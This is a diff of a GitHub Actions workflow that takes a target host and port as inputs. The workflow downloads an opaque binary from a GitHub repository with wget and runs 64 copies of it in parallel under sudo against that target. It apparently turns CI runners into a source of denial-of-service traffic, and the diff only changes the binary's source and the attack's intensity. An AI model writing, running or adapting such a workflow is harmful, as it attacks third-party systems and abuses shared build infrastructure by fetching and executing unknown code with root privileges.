@@ -1,4 +1,4 @@
-name: Beta !
+name: Tekil !
 
 on:
   workflow_dispatch:
@@ -29,12 +29,20 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/raw -O Beta
-          chmod +x Beta || true
-          
-          sudo timeout 65 ./Beta "$TARGET" "$PORT" 65 123 &
-          
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O Tekil
+          chmod +x Tekil || true
+
+          PIDS=()
+          for i in {1..64}; do
+            sudo timeout 30 ./Tekil "$TARGET" "$PORT" &
+            PIDS+=($!)
+          done
+
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
       - name: Finish !
         run: |
-          sleep 65
+          sleep 30
           exit 0
